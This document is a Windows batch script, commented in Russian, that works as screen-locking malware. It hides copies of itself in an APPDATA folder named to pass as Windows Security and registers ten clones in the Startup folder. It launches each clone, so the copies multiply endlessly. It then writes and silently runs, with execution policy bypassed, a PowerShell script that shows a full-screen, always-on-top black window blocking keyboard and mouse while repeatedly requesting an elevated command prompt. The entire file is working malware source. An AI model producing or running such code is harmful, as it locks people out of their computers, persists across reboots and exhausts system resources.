@echo off
setlocal enabledelayedexpansion

:: === Надёжная папка
set "safehome=%APPDATA%\Microsoft\Windows\WindowsSecurity"
mkdir "%safehome%" >nul 2>&1

:: === Путь к себе
set "self=%~f0"

:: === Клонируем себя 10 раз и добавляем все в автозагрузку
for /l %%i in (1,1,10) do (
    set "name=ban_%%i.bat"
    copy "%self%" "%safehome%\!name!" >nul
    copy "%safehome%\!name!" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\!name!" >nul
    start "" "%safehome%\!name!"
)

:: === Создаём PowerShell-блокер
> "%safehome%\locker.ps1" echo Add-Type -AssemblyName System.Windows.Forms
>> "%safehome%\locker.ps1" echo $form = New-Object Windows.Forms.Form
>> "%safehome%\locker.ps1" echo $form.WindowState = 'Maximized'
>> "%safehome%\locker.ps1" echo $form.FormBorderStyle = 'None'
>> "%safehome%\locker.ps1" echo $form.TopMost = $true
>> "%safehome%\locker.ps1" echo $form.BackColor = 'Black'
>> "%safehome%\locker.ps1" echo $form.KeyPreview = $true
>> "%safehome%\locker.ps1" echo $form.Add_KeyDown({$_.Handled = $true})
>> "%safehome%\locker.ps1" echo $form.Add_MouseDown({$_.Handled = $true})
>> "%safehome%\locker.ps1" echo while ($true) {
>> "%safehome%\locker.ps1" echo     Start-Process cmd.exe -Verb RunAs
>> "%safehome%\locker.ps1" echo     Start-Sleep -Seconds 2
>> "%safehome%\locker.ps1" echo     $form.ShowDialog()
>> "%safehome%\locker.ps1" echo }

:: === Запуск блокера
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%safehome%\locker.ps1"
